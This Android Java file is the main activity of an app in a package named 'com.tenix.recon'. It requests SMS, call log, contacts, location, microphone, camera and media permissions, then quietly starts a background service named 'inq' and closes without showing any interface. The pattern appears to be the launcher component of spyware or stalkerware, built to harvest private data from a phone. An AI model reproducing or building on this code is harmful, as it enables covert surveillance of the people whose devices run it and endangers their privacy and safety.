package com.tenix.recon;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;

public class MainActivity extends Activity {

    private static final int REQ = 1;

    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        if (hasPermissions()) launch();
        else ask();
    }

    @SuppressWarnings("NewApi")
    private void launch() {
        Intent svc = new Intent(this, inq.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
        else startService(svc);
        finish();
    }

    private boolean hasPermissions() {
        if (Build.VERSION.SDK_INT < 23) return true;
        for (String p : perms()) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    private String[] perms() {
        if (Build.VERSION.SDK_INT >= 33) {
            return new String[]{
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA
            };
        }
        return new String[]{
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA
        };
    }

    private void ask() {
        if (Build.VERSION.SDK_INT >= 23) requestPermissions(perms(), REQ);
        else launch();
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] p, int[] r) {
        launch();
    }
}
